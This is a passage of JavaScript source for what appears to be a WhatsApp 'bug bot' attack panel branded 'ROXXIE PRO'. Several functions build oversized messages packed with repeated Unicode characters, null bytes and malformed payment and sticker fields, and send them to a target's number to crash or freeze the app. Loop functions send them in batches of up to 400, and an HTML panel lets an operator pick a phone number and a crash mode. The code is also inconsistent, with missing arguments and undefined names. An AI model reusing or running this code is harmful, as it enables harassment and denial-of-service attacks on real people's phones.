        fileEncSha256: Buffer.from(corruptedJson).toString("base64"),
        mediaKey: Buffer.from(corruptedJson).toString("base64"),
        directPath: corruptedJson,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await sock.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
}
async function BlankClick(sock, target) {
    const bigString1 = "ી".repeat(120000);
    const bigString2 = "ꦽ".repeat(120000);
    const fakeThumb = Buffer.from(bigString1).toString("base64"); 

    const message = {
        message: {
            newsletterAdminInviteMessage: {
                newsletterJid: `33333333333333333@newsletter`,
                newsletterName: "-Roxxie - Crash" + bigString1,
                jpegThumbnail: fakeThumb,
                caption: bigString2 + "\n" + bigString1,
                inviteExpiration: Date.now() + 1814400000,
                extra1: bigString1,
                extra2: bigString2,
            },
        },
    };

    await sock.relayMessage(
        target,
        message,
        { userJid: target }
    );
}
async function Crash(sock, target) {
    const buttons = [
        {
            buttonId: "\u0000".repeat(599999),
            buttonText: { displayText: "Paket Bug Jancok By Roxxie Pro" },
            type: 1,
            nativeFlowInfo: { name: "single_select", paramsJson: "{}" }
        }
    ];

    let messagePayload = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: "0",
                    degreesLongitude: "0",
                    caption: "Ngewe Sama Jawir" + "ꦾ".repeat(12999),
                    sequenceNumber: "0",
                    jpegThumbnail: null,
                    contextInfo: {
                        virtexId: rizz.generateMessageTag(),
                        participant: "13135550002@s.whatsapp.net",
                        mentionedJid: [target, "0@s.whatsapp.net"],
                        isForwarded: true,
                        forwardingScore: 999,
                        externalAdReply: {
                            title: "Preview",
                            body: " Roxxie Ganteng",
                            mediaType: 2,
                            mediaUrl: "https://files.catbox.moe/7d57gc.mp4",
                            thumbnailUrl: "https://files.catbox.moe/ebag6l.jpg",
                            sourceUrl: "t.me/CRAZYBOTZZ"
                        },
                        quotedMessage: {
                            buttonsMessage: {
                                hasMediaAttachment: true,
                                contentText: "woy kontol kenal CRAZYBOTZZ?",
                                footerText: "",
                                buttons: buttons,
                                viewOnce: true,
                                headerType: 1
                            }
                        }
                    }
                }
            }
        }
    };

    await Sock.relayMessage(target, messagePayload, {
        messageId: sock.generateMessageTag(),
        participant: { jid: target }
    });
}
async function CrashMbud(sock, target) {
  try {
    const message = {
      stickerPackMessage: {
        stickerPackId: "72de8e77-5320-4c69-8eba-ea2d274c5f12",
        name: "Hi Kamu Birahi Kah".repeat(1000),
        publisher: "ꦾ".repeat(10000),
        stickers: [
          {
            fileName: "r6ET0PxYVH+tMk4DOBH2MQYzbTiMFL5tMkMHDWyDOBs=.webp",
            isAnimated: true,
            accessibilityLabel: "yandex",
            isLottie: false,
            mimetype: "image/webp"
          }
        ],
        fileLength: "99999999",
        fileSha256: "+tCLIfRSesicXnxE6YwzaAdjoP0BBfcLsDfCE0fFRls=",
        fileEncSha256: "PJ4lASN6j8g+gRxUEbiS3EahpLhw5CHREJoRQ1h9UKQ=",
        mediaKey: "kX3W6i35rQuRmOtVi6TARgbAm26VxyCszn5FZNRWroA=",
        directPath: "/v/t62.15575-24/29608676_1861690974374158_673292075744536110_n.enc",
        mediaKeyTimestamp: "1740922864",
        trayIconFileName: "72de8e77-5320-4c69-8eba-ea2d274c5f12.png",
        thumbnailDirectPath: "/v/t62.15575-24/35367658_2063226594091338_6819474368058812341_n.enc",
        thumbnailSha256: "SxHLg3uT9EgRH2wLlqcwZ8M6WCgCfwZuelX44J/Cb/M=",
        thumbnailEncSha256: "EMFLq0BolDqoRLkjRs9kIrF8yRiO+4kNl4PazUKc8gk=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "MjEyOGU2ZWM3NWFjZWRiYjNiNjczMzFiZGRhZjBlYmM1MDI3YTM0ZWFjNTRlMTg4ZjRlZjRlMWRjZGVmYTc1Zg==",
        stickerPackSize: "9999999999",
        stickerPackOrigin: "USER_CREATED"
      },
      interactiveMessage: {
        contextInfo: {
         mentionedJid: [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
           ],
          isForwarded: true,
          forwardingScore: 999,
          businessMessageForwardInfo: {
            businessOwnerJid: target
          }
        },
        body: {
          text: "Roxxie Pro Is Kings"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: ""
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`
            }
          ],
          messageParamsJson: "{}"
        }
      }
    };

    const msg = {
      key: {
        remoteJid: target,
        fromMe: true,
        id: `BAE5${Math.floor(Math.random() * 1000000)}`
      },
      message: message
    };

    await sock.relayMessage(target, message, { 
    messageId: msg.key.id 
    });
    
  } catch (error) {
    console.error("Error sending bug Fc sticker pack:", error);
  }
}

async function blank(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([          
          BlankClick(target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Blank 🦠
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`✅ Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( ROXXIE PRO ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function forcecrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          KontolCrtMakLoe(target), 
          OtaxCrashInvisible(target) 
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Bug Force 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( ROXXIE PRO ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function crashios(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          CrashMbud(target),
          Crash(target),
          BlankClick(target), 
          OtaxCrashInvisible(target),
          KontolCrtMakLoe(target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Crash iPhone 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( ROXXIE PRO ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}
async function invis(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          OtaxCrashInvisible(target),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Invisible 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( ROXXIE PRO ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ROXXIE PRO</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #000000, #330000, #7f0000);
      background-size: 400% 400%;
      animation: bgAnimation 20s ease infinite;
      color: #ff0000;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #ff0000;
      padding: 24px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 16px rgba(255, 0, 0, 0.8);
      backdrop-filter: blur(10px);
      position: relative;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 12px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 16px rgba(255, 0, 0, 0.8);
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      color: #ff0000;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
    }
    .connected {
      font-size: 14px;
      color: #ff0000;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5eff;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #1a0000;
      border: none;
      color: #ff0000;
      margin-bottom: 16px;
    }
    .buttons-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 16px;
    }
    .buttons-grid button {
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #330000;
      color: #ff0000;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }
    .buttons-grid button.selected {
      background: #ff0000;
      color: #000;
    }
    .execute-button {
      background: #990000;
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-bottom: 12px;
      cursor: pointer;
      transition: 0.3s;
    }
    .execute-button:disabled {
      background: #660000;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .execute-button:hover:not(:disabled) {
      background: #ff0000;
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(255, 0, 0, 0.15);
      border: 1px solid #ff0000;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease;
    }
    .footer-button:hover {
      background: rgba(255, 0, 0, 0.3);
    }
    .footer-button a {
      text-decoration: none;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* POPUP TENGAH */
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: #111;
      color: #00ff5e;
      padding: 16px 22px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,255,94,0.7);
      font-weight: bold;
      display: none;
      z-index: 9999;
      animation: zoomFade 2s ease forwards;
      text-align: center; /* ✅ fix text biar lurus tengah */
    }
    @keyframes zoomFade {
      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
      15% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      85% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://files.catbox.moe/dupkuy.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome User, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" placeholder="Please input target number. example : 62xxxx" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="force"><i class="fas fa-skull-crossbones"></i> FORCLOSE</button>
      <button class="mode-btn" data-mode="ios"><i class="fas fa-skull-crossbones"></i> CRASH IPHONE</button>
      <button class="mode-btn" data-mode="blanksuper"><i class="fas fa-dumpster-fire"></i> SUPER CRASH</button>
      <button class="mode-btn" data-mode="superinvis"><i class="fas fa-dumpster-fire"></i> INVISIBLE</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/CRAZYBOTZZ" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <!-- Popup Tengah -->
  <div id="popup" class="popup">✅ Success Send Bug</div>

  <script>
    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const popup = document.getElementById('popup');

    let selectedMode = null;

    function isValidNumber(number) {
      const pattern = /^62\\d{7,13}$/;
      return pattern.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      // Tampilkan pop up sukses
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 2000);

      // Arahkan ke link eksekusi
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};